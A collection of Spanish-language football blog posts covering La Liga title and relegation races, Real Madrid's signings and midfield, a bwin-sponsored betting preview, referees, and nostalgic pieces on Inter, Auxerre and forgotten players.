nuestros corazones.La tragedia, el disparate, son esenciales al fútbol. También lo es la superación, el florecimiento entre la miseria, la presión política, la homofobia, la soledad del ganador, el fracaso. El deporte, como fenómeno universal está cargado de humanidad, y el ser humano tiene luz y sombra en su interior. Soy humano y nada de lo futbolístico me es ajeno, dándole una vuelta de tuerca a Terencio.Los inspiradores, los que lo consiguen, van de las patatas al filete sin inmutarse, con elegancia y exactitud. Mucho de lo que se escribe ahora sigue rumiando la patata sin el mínimo interés en hincar el diente a la esencia sangrante de esta realidad. Por el miedo al colesterol, por el miedo a mancharse de barro. El rigor ha sobrepasado a la emoción. Hay más hueco que carne y esta moda por la relevancia está ahondando en el problema: bonitos artículos descargados de nervio, del ímpetu propio de un lance futbolístico.No sé hacia donde nos lleva la mutación. Yo me siento incómodo en esta cama, como tras una larga e insomne noche. Hay mucho de impostado en el nuevo lenguaje futbolístico, muy poca espontaneidad, una cortesía y blandura que vacían al fútbol de su esencia popular, de su sencillez universal, de su embrujo colectivo. Hay en los alrededores una nueva urbanización desde la que no se ve el campo de fútbol. Cuando uno lee a Enric González parece oler el césped mojado, cuando uno lee a Sid Lowe parece estar rodeado de aficionados gritones, cuando uno lee a Carlin parece escuchar el eco del entrenador en el vestuario; pero cuando uno lee mucho de lo que se publica ahora no pasa de oler el papel caro, nuevo y brillante, se siente rodeado de iluminados, parabólicos, estadistas o sesudos y tiene la sensación de escuchar un relato aburrido y mecánico sobre un deporte que ya no parece ni el mismo. El cambio se produjo en torno a los ocho años. Nos dimos cuenta de que ese balón ingobernable, vulnerable y colorido ya no respondía a nuestro instinto de futbolistas. Que el Super Tele con su rodar errático y sus vuelos de acróbata ya no satisfacía nuestra pulsión primaria, nuestras patadas con intención, nuestro juego sambístico. Fue entonces cuando el Mikasa llegó a nuestras vidas. En una comunión, o en el primer entrenamiento, sus triángulos japoneses, su material irrompible y la dureza del fútbol, por fin, sobre el campo de tierra. La verdad duele, se nos brinda como una ley que todo el mundo había mantenido en secreto: el fútbol es sufrimiento. Cuesta despegar la pesada bola del suelo. Ya no salen los tiros desde lejos, duelen los dedos, se amoratan, el tobillo se tuerce como la boca de una madre. Los regates son lentos, apretamos los puños. Luchamos contra el balón. Le golpeamos con rabia. El rival no es el otro equipo. Somos aliados. Vamos a por el balón. El portero siente el chasquido en las palmas de las manos. Se le saltan las lágrimas. Crujen las rodillas. Somos demasiado pequeños para hacer magia con esa pelota del diablo, con esa broma que llegó en forma de regalo.Dice el Cholo hoy en Marca que “siempre vas a triunfar más con carácter que jugando bien”. He imaginado a los jugadores del Atlético de Madrid entrenando con balones Mikasa. Reducidos, jibarizados, maltratados por el balón. Sacando cosas de dentro, cosas oscuras, infantiles, fobias, nervio, músculos indomables. Veo al Cholo como al entrenador de barrio, con el chándal lleno de recosidos. Viendo como el equipo lucha contra la bola, se opone a ella, trata de controlarla. Jugar bien es una ficción, es de Super Tele, la fantasía es sólo eso, fantasía. Sueños vacíos. La realidad es ese campo amarillo con polvo adherido al sudor, con balones con nuestra vida dentro. Con más pinchazos en los gemelos que en el cuero. El toque viene después, primero está la rabia. Competitividad se dice ahora, coraje decíamos de pequeños.A un amigo le regalaron el Questra. Lo acariciamos con los dedos diminutos como a una novia futura. El tacto parecía de otra cosa, de cualquier cosa menos de un balón. No nos atrevíamos a patearlo. No queríamos desconchar los pentágonos, no queríamos atenuar el brillo como de eclipse.Cuando nos decidimos echarlo al suelo jugamos suavemente, contuvimos las patadas marciales que le dábamos al Mikasa. Lo golpeábamos con el interior para no hacerle daño. Tirábamos a puerta rasa. Amortiguamos con el pecho su caída. El portero jugaba sin guantes para sentir el calor del cuero. Acaba el partido callejero y celebrábamos el balón. Lo mirábamos para comprobar que ahí seguía su tersura, su olor a nuevo.En el primer partido de Liga la pandilla del  Questra, mis amigos, no tocamos ni un balón, fuimos superados, avergonzados, apabullados. Los del Mikasa nos ganaron por muchos. El balón con su ruido de pesada piedra caía una y otra vez en nuestras redes. Tratamos de domarlo, pero el interior del pie apenas movía la esfera amarilleada por el campo. Ellos no sabían lo que era un Questra, ni falta que hacía. El Mikasa iba donde ellos decían que fuera.Quizá el Cholo tenga razón. Nos faltó el carácter que a ellos les sobraba. Y por eso ganaron el partido. Por eso el fútbol es una discusión donde la razón no importa. Por eso hasta la perfección es debatible. El fútbol empieza y acaba en el cerebro, los pies son sólo tentáculos unidos a nuestra mente. Puntos y más puntos en la maleta. Fin del viaje. La Liga se decide a la misma hora, en espacios paralelos, será dramático o será dichoso, esencia pura del fútbol. Hay quien se mira los pies y ve el abismo. Hay quien mira hacia arriba y ve sobre los edificios un cielo prístino. Mañana a las once sabremos mucho más de esta historia que agoniza. Salvo la tercera plaza del Valencia, el resto de equipos desconoce el balance de su temporada. El descenso es un juego perverso para al menos seis conjuntos. Europa espera a cinco clubes con una plaza de Champions sin decidir y el título prolonga el misterio con los dos gigantes luchando encarnizadamente, sumando más de noventa puntos, y sin posibilidad de error. El sábado de forma simultánea se decide el trofeo de la regularidad.El Xerez parece un equipo condenado. Pese al repunte de Gorosito, el equipo andaluz sigue su largo camino cuesta abajo. Se ha hablado tanto de milagro que ya ha perdido fuerza hasta la palabra. Tiene que ganar los dos partidos que le quedan y empezar a soñar con derrotas ajenas. Muy difícil para un equipo al que le ha venido demasiado grande el campeonato. El Valladolid de Clemente también usará la calculadora. Su enfrentamiento de mañana contra el Racing puede sacarlo del pozo en el caso de victoria pero le alejaría de la salvación si regala algún punto casero. El Tenerife, que recibe al prácticamente salvado Almería, debe ganar y demostrar en el campo aquello que decíamos hace no mucho en este blog, que tiene equipo y juego para algo más que salvar el cuello en la categoría de oro de nuestro fútbol. Pobre viaje sería volver a la segunda división tras el costoso y tardío ascenso conseguido el año pasado. El Málaga de Muñiz, que el año pasado hizo una extraordinaria temporada y que no empezó mal la actual, con un equipo plagado de jugadores prometedores y cedidos –Forestieri, Obinna, Caicedo-, ha ido derrumbándose paso a paso hasta peligrar su continuidad en la Liga BBVA. Su salida de esta semana a Getafe y sobre todo el partido de la última jornada frente a un Real Madrid que puede estar jugándose el trofeo le hacen serio candidato a ocupar una de esas plazas envenenadas. Por último el Sporting de Preciado parece tener la suerte de cara. La visita del Atlético a su feudo está más que descafeinada por el descanso que Quique ha dado a sus pretorianos pensando en las finales venideras. Un equipo plagado de canteranos o suplentes no debe ser rival para el equipo gijonés que de ganar vería alejarse la sombra del descenso.Para Europa hay cola. El renacido Villarreal y el titubeante Athletic de Caparrós quieren arrebatar la última plaza continental al estupendo Getafe de Michel. Los amarillos se han sobrepuesto a un principio desmoralizador con Valverde y han recuperado con Garrido el pulso liguero que los encumbró en anteriores ejercicios. El Athletic, que mañana puede ser verdugo del Real Madrid en el Bernabéu, aún tiene posibilidad de asomar el hocico en los puestos de honor de nuestra liga.Orillado Sahin por motivos que no conocemos, con las esperanzas en un paso adelante de Granero casi agotadas, Lass ausente y la certeza de que Khedira solo en el medio se parece mucho a jugar con los ojos vendados, se vuelve alargada la sombra de la famosa eliminatoria de Lyon de hace dos años; una época nada lejana en que los cuartos de final no se despreciaban como ahora, sino que, un lustro después, resultaban casi un Grial para el Madrid.Cada semana, y de la mano de bwin.com, os ofreceremos los partidos más interesantes del fútbol mundial, con especial atención a todos aquellos que os manejáis en el mundo de las apuestas on-line. Hay interés, por tanto, en calibrar el rendimiento del equipo sin Xabi, y sobre todo si Mourinho remendará la baja con una solución ofensiva ante un rival que previsiblemente saldrá muy atrás. El partido de la Real Sociedad parece una buena referencia, ya que el experimento del tridente –casi inédito durante la temporada-, unido a una presión más alta que en los últimos partidos y al repunte en la intensidad de ésta resultaron suficientes para desarbolar al rival y aventar los malos aires de la semana anterior. Con el choque en Pamplona a la vuelta de la esquina –que se señala con cierta razón como posible punto de inflexión, o no, de la Liga- el partido de hoy puede funcionar confirmar el fin del pequeño bache vivido por el Madrid, o sembrar más dudas en vísperas de una fecha crucial. Nadie en el entorno blanco cree, en cualquier caso, que con una vuelta en el Bernabéu la eliminatoria vaya a estar en peligro.Por supuesto , si este choque puede calificarse de entreguerras es por el desconocimiento generalizado del mundillo futbolístico hacia el Apoel Nicosia. El fútbol chipriota lleva demasiados años paseando el papel de cenicienta por Europa, y se atribuye más este éxito al nuevo formato de competición auspiciado por Platini que a un crecimiento futbolístico real. Los rivales con más nombre que ha dejado atrás el equipo capitalino se llaman Oporto  y Lyon –ambos en versiones muy menores- y sus hazañas han recordado más a la Grecia de 2004 que al Basilea que asombró al continente hasta que el Bayern Munich le recordó con dureza el escenario en que se hallaba. Un conjunto rocoso, pues, donde apenas suenan los nombres del ariete Esteban Solari –hermano del exmadridista-, el capitán Kostas Charalambides o el portero español Urko Pardo, y que explotará al máximo las tres bazas con las que cuenta, y que conviene no perder de vista en este tipo de choques: el calor de una afición febril que vivirá un momento histórico, un puñado de infrafutbolistas –dicho sea con todo el cariño- que quizá perciban sobre ellos todos los focos del continente por única vez en sus vidas, y que el desconocimiento del poderoso mute en desinterés. Por el bien del Madrid, que dentro de unos años Mourinho pueda seguir confundiendo al Apoel con el Anorthosis.En la casa de apuestas bwin la victoria madridista se paga a 1,25, el empate –ojo al recuerdo del CSKA- a unos apetitosos 5,50, y el improbable triunfo local a 11,50. Si presumimos un partido que comience a ritmo premioso –volvemos a la ausencia de Xabi- es interesante considerar que un primer tiempo sin goles se paga a 3,50, y un solo gol a 2,65. Si pensamos en cambio que en algún momento del segundo tiempo los chipriotas se desfondarán, es conveniente recordar que más de dos goles en la segunda se pagan a 3,80. Y si hablamos de nombres propios, cualquier goleador del equipo chipriota se paga a mínimo cuatro euros: ojo en este sentido al mencionado Solari y a Aílton. Finalmente, sin en quien queremos confiar es en el sempiterno Cristiano, recordar que su doblete está a 2,30; ya ha hecho demasiados como para despreciar esta posibilidad. Tras un mes de tabarra mediática en el que, día tras día, el nombre de Fabio Coentrao ha alternado en las portadas con los de Neymar y Kun Agüero, hoy se ha hecho oficial que el Real Madrid ha fichado al lateral de Vila do Conde, previo pago de 30 millones de euros y, parece ser, en el marco de una operación a gran escala con el Benfica en la que también entrarían los nombres de Ezequiel Garay y el díscolo Drenthe. El jugador luso firmará por seis temporadas.Coentrao es uno de los mejores laterales izquierdos del momento, y es difícil dudarlo para quien lo haya seguido esta temporada. Descubierto por muchos en el pasado Mundial –su paso por el Zaragoza resultó algo fantasmal- tanto la Superliga portuguesa como la Europa League han mostrado a un carrilero a la vieja usanza, muy bueno en el uno contra uno, que se asocia con facilidad y suele elegir correctamente el momento de la subida. Sin ser un Dani Alves en lo físico, suele ofrecer una prestación defensiva aceptable, y también un buen toque de bola. Por encima de todo, un futbolista muy fino.Sin embargo, a pesar de que Fabio probablemente ofrece el nivel requerido para jugar en un equipo como el Real Madrid, su contratación se antoja, más que acertada, innecesaria y caprichosa, y arroja una cierta sospecha sobre qué está ocurriendo últimamente con los fichajes del Madrid. Desde el punto de vista deportivo, por ejemplo, su puesto está perfectamente cubierto por un Marcelo que nos ha desmentido a muchos en los últimos años. El brasileño es un jugador cuyas cualidades y defectos son tan semejantes a los de Coentrao que podemos hablar de cromos repetidos. Se pueden distinguir matices, como que Fabio es más regate y Marcelo es más dinamismo, pero ambos corresponden esencialmente al mismo tipo de lateral izquierdo,  y además sus edades son similares.En esta tesitura, uno puede imaginar tres escenarios. En el primero, Coentrao es el titular y Marcelo el suplente; en ese caso, se estaría relegando al banquillo y devaluando una inversión de futuro del Madrid que se había ganado merecidamente el puesto y que en la actualidad es uno de los grandes activos de la plantilla; en el inverso, o incluso en el caso en que ambos se alternasen, estaríamos hablando de 30 kilos (más de 5.000 millones de pesetas, que siempre da mejor idea) en el banco en muchos partidos; y en el tercero, que mandar a Marcelo o Fabio a una posición diferente de la que les ha hecho grandes, es como mínimo un experimento, y en cualquier caso un despropósito. Desde el punto de vista económico, la operación también resulta poco deseable, y rompe una línea que, con pocas excepciones, se venía siguiendo desde la llegada de Mourinho al club blanco: jugadores en general jóvenes e interesantes desde el punto de vista deportivo comprados a precios razonables. Resulta un tanto extraño que el Madrid gaste esa cantidad de dinero en reforzar el lateral de Marcelo, cuando en el otro lado cada vez menos gente duda de que lo que hay es un central encubierto, o nada. Y eso sin hablar del centro del campo, donde aparte del gran Xabi Alonso y el emergente Sahin, encontramos un erial con varios futbolistas que no son capaces de llenar una camiseta blanca entre todos ellos. Es difícil no situar este fichaje, por tanto, en el capítulo de la megalomanía innecesaria, esa costumbre tan florentiniana que parecía cercana al destierro y que tanta antipatía ha granjeado al club blanco en los últimos años.Finalmente, no podemos dejar de señalar el tremendo peso que está adquiriendo el lobby portugués dentro del Real Madrid, y muy en particular el representante Jorge Mendes. Si bien es justo señalar que la mayor parte de los fichajes que han llegado de la mano del intermediario luso han dado un buen rendimiento en la entidad blanca y han disparado el potencial deportivo del Madrid, también lo es que uno de los episodios más chirriantes de la era Mourinho fue la insistencia del de Setúbal por Hugo Almeida, un futbolista de segundo nivel, muy lejos de lo que se exige en el Bernabéu. En este contexto, el fichaje de Coentrao por una cantidad tan elevada despertará inevitablemente algunas suspicacias. Aunque no dudemos de la calidad del futbolista. En dos segundos la pisa, con un pie, con otro, quiebra, se gira, apunta, y pegada al palo. Siempre a la sombra de Ibra en Suecia, un jugador para el que pasaron ya los trenes para la élite, pero que ha comenzado fenomenal la temporada, y que de vez en cuando se suelta con preciosidades Bergkamp-like como ésta: Johan Elmander, partido Bolton-Wolves. Hoy traemos a esta sección a Antonio Carbajal, el primer futbolista (luego lo lograría también Matthäus) en acudir a cinco Copas del Mundo. Carbajal fue el portero más laureado de la historia de México, un guardameta valiente y carismático, con autoridad, mejor en las salidas y por alto que debajo de los palos. El Tota, como se le conocía, acudió con la Tri a todos los mundiales entre 1950 y 1966 inclusive, y aunque su selección no pasó de la primera fase –el potencial de fútbol mexicano se hallaba muy lejos del actual- su silueta poderosa pronto se convirtió en un icono del torneo. Tras colgar las botas desarrolló una larga carrera como entrenador, especialmente en el Atlético Morelia, donde estableció un récord de longevidad que aún es suyo. Tiene 81 años. Un día cualquiera entre semana, una noche fría y desapacible, un derby copero en el Calderón. Rugía como suele la hinchada colchonera, con esa confianza infinita que por fin está obteniendo recompensa, y el volumen llegaba multiplicado y aterrador a las filas más bajas del coliseo del Manzanares. Era la clase de estruendo que sólo puede producir el odiado vecino entre los incondicionales del sur de la capital. Un pandemónium. De pronto, llega un despeje y el balón que vuela al cielo de Madrid como impulsado por una mecha invisible. Cuando desciende, una bala en la noche, su camino irrefrenable hacia el césped resulta interrumpido; en una maniobra imposible, Mesut Özil ha movido la pierna lo justo, la ha colocado en la posición precisa a la velocidad correcta, y la pelota le ha obedecido hasta un extremo antinatural, como si un sortilegio, y no solamente una suerte técnica, hubiera actuado sobre su esfera. Y luego, el silencio.No fue aquello un silencio normal. Se abatió sobre el Calderón como una nube de tormenta en un día de verano, suave y brusco a la vez, definitivamente irrechazable. Casi podían percibirse las voces congeladas en alientos que se negaban a salir, las gargantas preparadas para gritar gol y maldecir al enemigo convertidas de pronto en instrumentos inútiles, artefactos inservibles en la noche. Nos vimos envueltos en un silencio palpable, vivo, que envolvía y reflejaba la belleza como el agua de rosas alrededor del cuello de una mujer hermosa.El fútbol retorcido y extremo que plantea el técnico utrerano ha sido suficiente para catapultar a los jugadores vascos hacia la parte noble de la tabla. El gran caramelo de Europa, la plaza restante para la Champions League, será del Mallorca o del Sevilla. Los de Gregorio Manzano han nadado contracorriente en una entidad salpicada de escándalos, impagos y corruptelas. Con un equipo básico pero bien avenido han conseguido convertir San Moix en un estadio inexpugnable. Volver a la máxima competición europea es un premio mayúsculo para los baleares que visitan a un Deportivo abonado a la derrota y que deambula desde hace unas semanas en tierra de nadie. El Sevilla, que parece haber superado la marcha de Jiménez y la eliminación de la Liga de Campeones, se juega la plaza frente al Barcelona. Auténtico magnicidio si los de Nervión logran derrotar al actual líder, cosa nada improbable viendo sus enfrentamientos recientes. Navas dice que ganan seguro pero el fútbol de los de Álvarez no anima a ser tan optimista como el veloz extremo de Los Palacios.Por último, y dicho casi todo ya, Madrid y Barcelona jugándose el liderato. Ambos han superado los noventa puntos, récords anotadores, pichichis, zamoras, la práctica perfección sobre el césped. Los culés con un juego preciosista y efectivo, los merengues con una rabia y una pegada que parece ser marca de la casa. Dos vías diferentes para llegar al mismo destino. Los dos fuera de Copa y Champions, los dos con el único título que pueden levantar este año. Fracaso en uno y otro lado no celebrar nada la temporada más disputada en años. Ganar es la inscripción en la retina de los jugadores. Ninguna especulación lleva a levantar esta única copa restante. Mañana sábado, a las nueve, podemos dar por finalizada una temporada bipolar, pero brillante. Imaginemos que el campo es el océano. Que los once jugadores son un archipiélago de islas. Más ricas, menos ricas, con mejores o peores playas. Imaginemos que hay una ínsula donde todo el que llega desaparece, donde nadie logra establecerse, donde hay más náufragos que nativos. Donde, realmente, nadie quiere pasar la noche por miedo a no amanecer. Permitidme la metáfora, ya es bastante aburrido leer la prensa deportiva. Hablamos del archipiélago madridista ¿Sabéis en qué coordenadas está la isla? ¿Habéis llegado ya a ubicarla? Efectivamente… la isla misteriosa es el puesto de mediocentro defensivo. El stopper. Como quieran llamarlo. No sabemos si es el humo negro, los caníbales, los piratas o algún monstruo mutante de serie-b. Cualquier ficción me vale para explicar la carnicería constante que esa posición ha traído al Real Madrid.La marcha de Makelele marcó una especie de hito en la carrera de éxitos del club blanco. A su vez, empezaba a ponerse de moda esa posición del campo que no siempre había sido asociada a esas virtudes tan burdamente achacadas a los jugadores negros, especialmente africanos, o franceses como el citado o Vieira. De repente, el fútbol dependía de la basculación, de la contención y de ese futbolista sacrificado, expeditivo, rápido e incansable que taponaba la creación del contrario y se lavaba las manos, a menudo, en el ataque de su equipo. Una posición que venía a sustituir al mucho más creativo “cinco” argentino –Redondo en el recuerdo-, o a ese otro perfil equilibrado que representaban Guardiola, Rijkaard, Davids o Albelda (con el perdón de Ramón Flores). Visto lo visto, y con el innegable rendimiento del Madrid en aquel tiempo, cuando vinieron las vacas flacas todo parecía responder a la ausencia de un jugador que sirviera de contrafuerte de una pandilla talentosa, esa que representaban Guti, Zidane, Ronaldo o Beckham. Tenían un portero estelar, una defensa aseada, un mediocampo creativo magnífico y una delantera puntualmente brillante. Pero nunca se encontró ese jugador indómito que rindiera al nivel de otros que daban clases magistrales por Europa en aquella época: Essien, Senna, Gilberto Silva o Roy Keane. Era habitual creer que la ausencia de Makelele había dinamitado el orden de un equipo con tendencia a la anarquía, a ese desorden que sólo el talento produce, a esa fuerza dispersa que acababa con la solidez de un bloque millonario pero perdedor.La isla misteriosa ha sido habitada por un buen puñado de jugadores. Algunos experimentados, otros que habían brillado en sus equipos de origen, algunos inventos y algún que otro palpable desacierto. Recuerdo la incapacidad de Pablo García de hacerse con el control del equipo, la rocambolesca presencia de Gravesen, la falta de oportunidades de un Javi García que ha demostrado ser más de lo que dejo ver en su temporada, la falta de acople de Emerson, el extraño periplo del que parecía la solución, Mahamadou Diarra…Y ahora, de nuevo, se abre el debate. Creo que hubo en la dirección deportiva del Real Madrid un cambio de paradigma. El problema es que la solución se convirtió en problema. Gago era un jugador para cambiar el perfil, para aportar toque donde se insistía en el músculo, una manera de recuperar el aroma de Redondo, un jugador muy fino para un puesto que se había convertido en una suerte de escombrera humana. Hizo aguas y cuando le tocó llevar el peso del equipo, de un equipo además no esencialmente brillante y con más brega y pegada que fútbol, no supo actuar, se petrificó, se echó a un lado. Vino Lass y todo parecía perfecto. Creo que el parecido razonable con ese añorado Makelele hizo creer a la parroquia blanca que la solución era esa. Pero el francés es una suerte de pelota de pinball que rueda por el césped sin demasiado criterio, taponando pero dejando huecos, sumándose al ataque pero desnudando los flancos de los laterales, con arranques de talento pero sin una regularidad imprescindible para ser titular del Madrid. Y con el 10 en la espalda, con lo que pesan esas cosas.Ahora estamos con Khedira. Se me acaban los argumentos para defenderle. Es otra cosa, no hay duda. Su posición es importante en el Madrid de Mourinho. Un buen escudero de Xabi Alonso, que sabe jugar solo en la isla, que no se arruga demasiado, pero con unas carencias ofensivas que lo hacen palidecer si lo comparamos con otros jugadores de su perfil. Atrás se mantiene pero cuando toca ir al ataque su labor es periférica y profundamente blanda.Para mí la referencia en el puesto es Busquets. Ha venido a sustituir al perfil Makelele con buen toque y más presencia física. Otro modelo de náufrago. Con muchas obligaciones, con muchos huecos que tapar, pero con una impresionante anticipación. No necesita ser tan rápido si se adelanta dos o tres segundos a las jugadas rivales. Lass corre más porque siempre tiene prisa, porque siempre llega tarde. Atrás queda, por desgracia, lo que pudo ser De la Red si su grave problema de corazón no lo hubiera apartado del fútbol. ¿Cuál es vuestra opinión ahora? ¿Cuál sería la solución del Madrid? ¿Hay jugadores en el mercado que puedan aportar solidez a una línea históricamente tierna? ¿Es suficiente la pareja Granero – Alonso para los partidos importantes? Buscaré un símil concluyente: hablar de los árbitros es como cambiarle los pañales a un bebé, al mínimo descuido puedes ser tú el que acabe sucio. Será útil para entrenadores y jugadores. Cuestionar la ley sólo cuando nos perjudica es también un ejercicio muy nuestro, muy de andar por casa. La actuación de Pérez Burrull el pasado domingo fue calamitosa. Estuvo desnortado y permeable, impropio de un colegiado de primera tal vez, y logró aquello que siempre se anuncia de un modo apocalíptico: que el árbitro sea protagonista en lugar de los futbolistas. Sin embargo, y visto el aluvión de críticas –de ahora, de ayer y de siempre-, debo recordar que el árbitro es el máximo responsable sobre el tapete de hierba y que cuestionar ya no su imparcialidad sino su legitimidad es ir contra el equilibrio del fútbol. La nevera, castigar a los jueces, tampoco ayuda mucho a reforzar una institución que se ha terminado convirtiendo en el centro de las iras, en la justificación de las derrotas, los colegiados son los enemigos cuando la realidad deportiva exige otra cosa, más bien el respeto a las normas y a quien se encarga de supervisarlas en el transcurso de un partido.No es un tema nuevo, diría que es tan antiguo como el propio fútbol, pero el florecimiento de portadas iracundas contra el estamento arbitral, los comentarios recurrentes en la retransmisión de un partido e incluso los insultos solemnizados en los numerosos debates deportivos han llegado a colapsar una figura, la del árbitro, que –insisto- es imprescindible en el fútbol tal como lo conocemos. Nadie se echa las manos a la cabeza cuando se dice, tan a menudo, eso de “los árbitros son muy malos”, como si no cupiera la posibilidad de que fueran buenos, como si el hecho de ser árbitro los colocara ya en la morralla futbolística. Me recuerda a ese otro tema tan español que es el de “los políticos son todos unos sinvergüenzas”. Ambas afirmaciones entrecomilladas son peligrosas y acomodadas. En ambas nos lavamos las manos, echamos balones fuera, nos posicionamos en el otro lado, como si no fuéramos conscientes de lo importante que son ambos colectivos, de su incuestionable importancia en sus respectivas funciones sociales, como si realmente pudiéramos vivir tranquilos con esa mácula sobre unos y otros, con esa agria sospecha sobre la legitimidad de todos ellos.Nos guste o no, la figura del colegiado es irrenunciable. Ya sean tres, cuatro o seis, los árbitros y sus asistentes tienen en sus silbatos y banderines la responsabilidad de que el fútbol discurra por los cauces reglamentarios. Es una labor difícil, obviamente. Hay demasiada gente viendo la televisión, demasiada gente en las gradas y lo que está en juego es algo más que la cuenta de pelotitas que caen en la red. Hay dinero, prestigio, inversiones millonarias, competitividad y negocio. Es fundamental la presencia de una persona que haga cumplir el reglamento, un juez con autoridad para decidir en caso de duda, tantas cosas dependen de su visión, su criterio y su honradez. Cuestionar por cuestionar, a las bravas, es hacer tambalearse este deporte, alienarlo. Y digo esto porque no se critican los errores sino la presencia misma de ese señor, generalmente adusto, al que siempre se le asocia con extraños intereses de club o fobias personales.La nevera no es la solución. Tampoco la proliferación de árbitros como se está demostrando en la Europa League. El ojo de halcón será circunstancial, como lo fue la figura del cuarto árbitro. Todo pasa por una sencilla práctica que nada tiene que ver con la tecnología: confiar en la legitimidad del colegiado, no cuestionar sus decisiones, asumir que el error es sólo eso, una falta de apreciación, una confusión visual, en todo caso la mejor de las opciones para el que pita. Es ingenuo, lo sé, pero por algo hay que empezar. La conspiranoia sólo sirve para pasar el rato y si lo que nos gusta es el fútbol debemos asumir que la posición del árbitro debe ser respetada y cuidada, son inocentes hasta que no se demuestre lo contrario. Y por supuesto, no ir cacareando por las radios en contra de su figura, no hacer reproches, no tratar de engañarlo en el campo, no fingir lesiones para perder tiempo, no lanzarse en el área, no insultar, no adelantar el balón unos centímetros en los saques de esquina, no cargarle la culpa cuando el equipo no funciona… esas cosas que vemos a diario sobre el césped pero que tienen menos importancia de la que deberían tener, porque la perversión de las reglas es tan perjudicial para el fútbol como la mala fe de un árbitro.Y una última petición: algo más de sensatez para los colegiados, que abandonen su posición defensiva, que den un pasito al frente en busca de esta concordia necesaria. Que abandonen su cápsula y se dejen escuchar por los aficionados, que lleven su obligación con naturalidad, que tiendan su mano a los jugadores y dejen de desafiarlos, que se ganen la autoridad a través de la comprensión y no de la jerarquía. Más transparencia en sus decisiones colegiadas, un sistema de elección claro y consensuado, que se conviertan en un estamento que garantice que los que pitan son los mejores posibles y si hay exclusiones o neveras, que las haya siempre, con criterios prefijados, con normas públicas. Al fin y al cabo… ¿quién arbitra a los árbitros? Existió en el fútbol una época en la que las parabólicas eran sólo una anécdota. Desconocidos equipos del norte se desempeñaban con dignidad en las grandes citas europeas, recuerdos del Rosenborg –impenitente rival para los españoles-, del Malmö –finalista en el 79- o de aquel Odense de infausto recuerdo para la parroquia madridista.Este año, centrados en la Champions, encontramos la sorpresa del FC Copenhague que, tras una meritoria fase de grupos, logró pasar por primera vez en su historia a la alfombra roja de la máxima competición europea. Pioneros además en el fútbol danés, un país que nunca había vivido nada parecido. Guardiola, que se los cruzó en la primera fase, nos alertó a todos de la peligrosidad de los nórdicos. Pocos le creímos viendo a un equipo bisoño, algo rígido, y sin ningún nombre especialmente llamativo en sus filas, tal vez Gronkjaer –sintomático-. El empate a uno entre un entonado Barça y esta sorpresa danesa allá por noviembre nos hizo considerar seriamente a los hombres de Solbäkken.En el otro lado está el Chelsea de Ancelotti.La mayoría entiende que las chimeneas gigantes escupiendo vapor todo el santo día además de afear el horizonte son, y la razón médica les asiste, malísimas para la salud. Sin embargo a mí me seduce la belleza brutal de algunos complejos industriales. Podría parecer que la tontería me viene de cuna, que siendo asturiano como soy lo de haber nacido en tierra fabril por excelencia me ha marcado. Pero no es el caso. Entonces, si mi madre me trajo al mundo en la noble, benemérita, muy pija y escasamente industriosa ciudad de Oviedo y mi familia jamás pisó una mina, ¿por qué la filia? Sencillamente por llevar la contraria. Y es que toda una vida escuchando la sempiterna cantinela del paraíso natural en boca de todos aquellos que no tienen nada que decir quema a cualquiera. Créanme. Bien, pues este espíritu pero con todos sus síntomas aplicados al fútbol es el mismo que me llevó a aficionarme al Inter de Milán.Recuerdo que mi simpatía por el Inter, conocido en Italia como la bienamada no (contra todo pronóstico) por su histórica y casi enfermiza querencia al final decepcionante pese a los numerosos títulos que adornan sus vitrinas, comienza, más o menos, en el año 1993. Y como las cosas realmente buenas todo sucedió por casualidad. Durante un viaje a Cataluña con el colegio y en uno de los pocos momentos en que las hormonas quisieron darle tregua a mis quehaceres púberes, vi en un chiringuito playero de Empuriabrava una  réplica de la camiseta del Inter con el nombre de Dennis Bergkamp  serigrafiado en la espalda. Mis amigos mercaron elásticas de Alemania, de la seleccion holandesa, del Barcelona o la muy cotizada rojinegra del Milan pero yo me hice con aquel trozo de tela azulnegra, más falsa que Figo besuqueando el escudo, con la publicidad de Fiorucci en el pecho y la llevé encima durante todo el verano. Lo que hice en principio por distanciarme del resto sirvió para aficionarme al Inter.Reconozco que, entre lo rácano de su juego y que está comandado por ese maquiavelo de las relaciones públicas que atiende por José Mourinho, el neroazzurro no es un combinación de colores demasido apreciada fuera de Italia. También que mi simpatía por el club se ha acrecentado viendo perder, una y otra vez,  y ganar ocasionalmente a jugadorazos como Ruben Sosa, al muy reivindicable Yuri Djorkaeff, al Ronaldo astro y gordo,  a Roberto Baggio o a ese genio de la jugada loca que atiende al nombre de  Kanu. El Inter ha sido, sin duda alguna y desde que yo alcanzo a recordar, el mayor elenco de talentos de  la historia del fútbol empecinados en lograr un objetivo común: la  derrota. Y esto en lo que, hay que reconocerlo, siempre ha sido club maestro le ha hecho fascinante a mis ojos. Por eso, esta época de éxitos está resultando tan extraña para el hincha interista. Porque más que ningun otro aficionado del mundo, sabemos que el vagón de la montaña rusa puede empezar a descender en  cualquier momento. De hecho, es rarísimo que no lo haya hecho ya. Por cierto, el Inter de Milán juega hoy la semifinal de la Copa de Europa contra el Barcelona. Disfrutemos del momento mientras dure. El Real Madrid aterrizará mañana en Francia, en el Abbé Deschamps, en busca de tres puntos y algo de sosiego ante un Auxerre ciertamente menos temible que el que fuera doble campeón de Liga y Copa en 1996. Y aprovechando la coyuntura me apetecía recordar con vosotros a aquel equipo en el que se ganaban el pan unas cuantos inquilinos habituales de la liga española. Buenos peloteros como Laurent Blanc y Corentin Martins y perfiles “under” como Franck Rabarivony, Frederic Danjou o Moussa Saib hicieron campeón, por primera y única ocasión, al club que dirigía el sempiterno Guy Roux. Disfruten. Artículos a destiempo sobre jugadores extraños. Lo hacía un poco por tocar los huevos, aunque últimamente creo que ya ni lo consigo, y son mi marca de fábrica así que ahí va. Gerónimo Barbadillo, el Patrulla. Cromo tirando a icónico por lo suyo en el Perú y el en el Avellino imprevisible de los primeros ochenta. Patrulla. Su apodo nació de millones de peruanos vomitando televisión de derribo y su leyenda de balancearse con delidadeza por la línea que tensa el carril del ocho. Con la franja peruana, en México lindo y querido o con la verde del lobo irpino.Hubo un tiempo en que insulté, yo sólo y voz en grito frente al ordenador como hacen los deficientes, a los que escriben sobre futbolistas que nunca han llegado a ver en vivo y en directo. ‘Eh! , que yo también lo hacía, pero con mesura, no como esos astutos practicantes del panegírico sobre sombras. Hoy reconozco que me equivocaba. De tanto comer fútbol, por el empacho de la actualidad, me ha apetecido contar sobre el negro del afro que regateaba jugadores más ricos que él en el calcio 80. De una sombra que está sentada, tomando mate, en el hemisferio derecho de mi cabeza. 